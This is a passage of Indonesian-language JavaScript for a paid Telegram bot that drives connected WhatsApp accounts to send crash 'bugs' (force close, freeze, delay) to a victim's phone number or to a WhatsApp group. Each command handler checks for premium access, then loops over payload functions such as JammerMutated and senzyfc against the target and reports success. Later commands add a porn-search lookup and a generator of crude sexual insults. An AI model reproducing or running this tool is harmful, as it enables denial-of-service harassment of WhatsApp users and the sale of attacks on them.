◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : DELAY IPHONE X ANDRO
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});


bot.onText(/\/invisfc (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA KING👑 LUV2HATE
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝐎𝐖𝐍𝐄𝐑",
              url: "https://t.me/sallstecu",
            },
          ],
        ],
      },
    });
  }


  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }

    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/3i9q09.jpg",
      {
        caption: `\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @sallatecu
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : FORCE CLOSE
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
        parse_mode: "Markdown",
      }
    );

    let count = 0;

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 5; i++) {
      await locationfc(jid, ptcp = true);
      console.log(
        chalk.red(
          `[BROTHERS] BUG Processing ${count}/30 Loop ke ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageCaption(
      `
\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @sallstecu
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : FORCE CLOSE
◇ 𝐊𝐎𝐑𝐁??𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/ForceCloseNewV2 (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA KING👑 LUV2HATE 
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝐎𝐖𝐍𝐄𝐑",
              url: "https://t.me/sallstecu",
            },
          ],
        ],
      },
    });
  }


  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }

    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/3i9q09.jpg",
      {
        caption: `\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @sallstecu
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : FORCE CLOSE 
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
        parse_mode: "Markdown",
      }
    );

    let count = 0;

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 1; i++) {
      await senzyfc3(jid);
      console.log(
        chalk.red(
          `[BROTHERS] BUG Processing ${count}/30 Loop ke ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageCaption(
      `
\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @sallstecu
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : FORCE CLOSE
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});



bot.onText(/\/invisfcv1 (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA KING👑 LUV2HATE
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝐎𝐖𝐍𝐄𝐑",
              url: "https://t.me/sallstecu",
            },
          ],
        ],
      },
    });
  }


  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }

    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/3i9q09.jpg",
      {
        caption: `\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @sallstecu
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : FORCE CLOSE V2
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
        parse_mode: "Markdown",
      }
    );

    let count = 0;

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 1; i++) {
      await sendFreezeDroid(target);
      console.log(
        chalk.red(
          `[BROTHERS] BUG Processing ${count}/30 Loop ke ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageCaption(
      `
\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @sallstecu
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : FORCE CLOSE V2
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/invisfcXcombo (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA KING👑 LUV2HATE 
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝐎𝐖𝐍𝐄𝐑",
              url: "https://t.me/sallstecu",
            },
          ],
        ],
      },
    });
  }


  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }

    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/3i9q09.jpg",
      {
        caption: `\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @sallstecu
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : FORCE CLOSE COMBO
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
        parse_mode: "Markdown",
      }
    );

    let count = 0;

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 1; i++) {
      await senzyprivate(sock, jid);
      await InvisibleFC(sock, jid);
      console.log(
        chalk.red(
          `[BROTHERS] BUG Processing ${count}/30 Loop ke ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageCaption(
      `
\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @sallstecu
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : FORCE CLOSE COMBO
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});
bot.onText(/\/ForceCloseNewXdelay (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA KING👑 LUV2HATE 
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝐎𝐖𝐍𝐄𝐑",
              url: "https://t.me/sallstecu",
            },
          ],
        ],
      },
    });
  }


  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }

    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/3i9q09.jpg",
      {
        caption: `\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @sallstecu
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : FORCE CLOSE DELAY
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
        parse_mode: "Markdown",
      }
    );

    let count = 0;

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 5; i++) {
      await senzyfc2(jid);
      await senzyfc1(jid);
      await JammerMutated(jid);
      await JammerMutated(jid);
      await JammerMutated(jid);
      await JammerMutated(jid);
      await JammerMutated(jid);
      await JammerMutated(jid);
      await JammerMutated(jid);
      await JammerMutated(jid);
      console.log(
        chalk.red(
          `[BROTHERS] BUG Processing ${count}/30 Loop ke ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageCaption(
      `
\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @sallstecu
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : FORCE CLOSE DELAY
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/fcnoinvis (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA KING👑 LUV2HATE 
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝐎𝐖𝐍𝐄𝐑",
              url: "https://t.me/sallstecu",
            },
          ],
        ],
      },
    });
  }


  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }

    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/3i9q09.jpg",
      {
        caption: `\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @sallatecu
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : FORCE CLOSE ( no work all divice) 
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
        parse_mode: "Markdown",
      }
    );

    let count = 0;

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 1; i++) {
      await antiFixForclose(sock, jid)
      console.log(
        chalk.red(
          `[BROTHERS] BUG Processing ${count}/30 Loop ke ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageCaption(
      `
\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @sallstecu
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : FORCE CLOSE ( no work all divice) 
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});
//bug grup
bot.onText(/\/blankgroup(?:\s(\S+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(senderId);

  const args = msg.text.split(" ");
  const groupLink = args[1] ? args[1].trim() : null;

  // cek cooldown
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Jeda dulu ya kak! ${cooldown} detik.`);
  }

  // cek premium
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "```LU SIAPA? JOIN SALURAN DULU KALO MAU DIKASI AKSES```",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "SALURAN LUV2HATE",
              url: "https://t.me/+DBQnLZ-MPr1iZWY1",
            },
          ],
        ],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Hubungkan dulu dengan /addsender 62xxx"
      );
    }

    if (!groupLink) {
      return bot.sendMessage(chatId, "Contoh: /blankgroup https://chat.whatsapp.com/xxxx");
    }

    // ambil kode dari link
    const groupCode = extractGroupID(groupLink);
    if (!groupCode) {
      return bot.sendMessage(chatId, "❌ Link grup tidak valid.");
    }

    // dapatkan JID grup dari invite code
    const res = await sock.groupAcceptInvite(groupCode);
    const groupJid = typeof res === "string" ? res : res.id || res.jid; // normalisasi

    if (!groupJid) {
      return bot.sendMessage(chatId, "❌ Tidak bisa ambil groupJid.");
    }

    // kirim pesan ke grup (contoh aman, bukan bug/crash)
    let success = false;
    try {
      for (let i = 0; i < 5; i++) {
        await bugGroup(groupJid);
        await sleep(1500);
      }
      success = true;
    } catch (e) {
      console.error("Error kirim ke grup:", e);
      success = false;
    }

    if (success) {
      await bot.sendPhoto(chatId, "https://files.catbox.moe/4u6jht.jpg", {
        caption: `
\`\`\`
#SUCCES BUG❗
- status : Success
- Link : ${groupLink}
\`\`\`
`,
        parse_mode: "Markdown",
      });
    } else {
      await bot.sendMessage(chatId, "Gagal Mengirim Bug");
    }
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

//======= tols=======//

bot.onText(/^\/xnxx(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const query = match[1];

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to add premium users."
    );
  }
  
  if (!query) {
    return bot.sendMessage(chatId, '🔍 Contoh penggunaan:\n/xnxx jepang');
  }

  try {
    const res = await axios.get('https://www.ikyiizyy.my.id/search/xnxx', {
      params: {
        apikey: 'new',
        q: query
      }
    });

    const results = res.data.result;

    if (!results || results.length === 0) {
      return bot.sendMessage(chatId, `❌ Tidak ditemukan hasil untuk: *${query}*`, { parse_mode: 'Markdown' });
    }

    const text = results.slice(0, 3).map((v, i) => (
      `📹 *${v.title}*\n🕒 Durasi: ${v.duration}\n🔗 [Tonton Sekarang](${v.link})`
    )).join('\n\n');

    bot.sendMessage(chatId, `🔞 Hasil untuk: *${query}*\n\n${text}`, {
      parse_mode: 'Markdown',
      disable_web_page_preview: true
    });

  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, '❌ Terjadi kesalahan saat mengambil data.');
  }
});



const splitText = (text, maxLength = 4000) => {
  const parts = [];
  while (text.length > 0) {
    parts.push(text.slice(0, maxLength));
    text = text.slice(maxLength);
  }
  return parts;
};
bot.onText(/^\/brat(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const argsRaw = match[1];
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to add premium users."
    );
  }
  
  if (!argsRaw) {
    return bot.sendMessage(chatId, 'Gunakan: /brat <teks> [--gif] [--delay=500]');
  }

  try {
    const args = argsRaw.split(' ');

    const textParts = [];
    let isAnimated = false;
    let delay = 500;

    for (let arg of args) {
      if (arg === '--gif') isAnimated = true;
      else if (arg.startsWith('--delay=')) {
        const val = parseInt(arg.split('=')[1]);
        if (!isNaN(val)) delay = val;
      } else {
        textParts.push(arg);
      }
    }

    const text = textParts.join(' ');
    if (!text) {
      return bot.sendMessage(chatId, 'Teks tidak boleh kosong!');
    }

    // Validasi delay
    if (isAnimated && (delay < 100 || delay > 1500)) {
      return bot.sendMessage(chatId, 'Delay harus antara 100–1500 ms.');
    }

    await bot.sendMessage(chatId, '🌿 Generating stiker brat...');

    const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isAnimated=${isAnimated}&delay=${delay}`;
    const response = await axios.get(apiUrl, {
      responseType: 'arraybuffer',
    });

    const buffer = Buffer.from(response.data);

    // Kirim sticker (bot API auto-detects WebP/GIF)
    await bot.sendSticker(chatId, buffer);
  } catch (error) {
    console.error('❌ Error brat:', error.message);
    bot.sendMessage(chatId, 'Gagal membuat stiker brat. Coba lagi nanti ya!');
  }
});
bot.onText(/^\/(ai|openai)(\s+.+)?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[2]?.trim();
  const argsRaw = match[1];
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to add premium users."
    );
  }

  if (!text) {
    return bot.sendMessage(chatId, 'Contoh: /ai siapa presiden indonesia');
  }

  await bot.sendMessage(chatId, 'Tunggu sebentar...');

  try {
    const res = await fetch(`https://fastrestapis.fasturl.cloud/aillm/gpt-4o-turbo?ask=${encodeURIComponent(text)}`);
    const data = await res.json();

    if (!data.status) {
      return bot.sendMessage(chatId, JSON.stringify(data, null, 2));
    }

    const replyText = `*© AI - Asistent New Latest*\n\n${data.result}`;
    await bot.sendMessage(chatId, replyText, { parse_mode: 'Markdown' });
  } catch (err) {
    console.error("AI Command Error:", err);
    bot.sendMessage(chatId, 'Terjadi kesalahan saat menghubungi AI.');
  }
});
bot.onText(/^\/cekkodam(?: (.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const nama = (match[1] || '').trim();
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  if (!nama) {
    return bot.sendMessage(chatId, '𝗻𝗮𝗺𝗮𝗻𝘆𝗮 𝗺𝗮𝗻𝗮? ');
  }

  const khodamList = [
    'si ganteng',
    'Mie ayam', 
    'kang rinem', 
    'jelek dekil hytam', 
    'ganteng kalem', 
    'sangean', 
    'cabul', 
    'suka ngocok', 
    'suka bokep indo',
    'suka bokep jepang', 
    'si jelek',
    'anomali bt script',
    'kang hapus sumber',
    'kang ngocok',
    'Anomali maklu',
    'orang gila',
    'anak rajin',
    'anak cerdas',
    'lonte gurun',
    'dugong',
    'macan yatim',
    'buaya darat',
    'kanjut terbang',
    'kuda kayang',
    'janda salto',
    'lonte alas',
    'jembut singa',
    'gajah terbang',
    'kuda cacat',
    'jembut pink',
    'sabun bolong'
  ];

  const pickRandom = (list) => list[Math.floor(Math.random() * list.length)];

  const hasil = `

<blockquote><strong>𝗵𝗮𝘀𝗶𝗹 𝗰𝗲𝗸 𝗸𝗵𝗼𝗱𝗮𝗺 :</strong></blockquote>
 ◇ 𝗻𝗮𝗺𝗮 : ${nama}
 ◇ 𝗸𝗵𝗼𝗱𝗮𝗺𝗻𝘆𝗮 : ${pickRandom(khodamList)}
  `;

  bot.sendMessage(chatId, hasil, { parse_mode: 'HTML' });
});

bot.onText(/\/tourl/i, async (msg) => {
    const chatId = msg.chat.id;
    
    
    if (!msg.reply_to_message || (!msg.reply_to_message.document && !msg.reply_to_message.photo && !msg.reply_to_message.video)) {
        return bot.sendMessage(chatId, "❌ Silakan reply sebuah file/foto/video dengan command /tourl");
    }

    const repliedMsg = msg.reply_to_message;
    let fileId, fileName;

    
    if (repliedMsg.document) {
        fileId = repliedMsg.document.file_id;
        fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
    } else if (repliedMsg.photo) {
        fileId = repliedMsg.photo[repliedMsg.photo.length - 1].file_id;
        fileName = `photo_${Date.now()}.jpg`;
    } else if (repliedMsg.video) {
        fileId = repliedMsg.video.file_id;
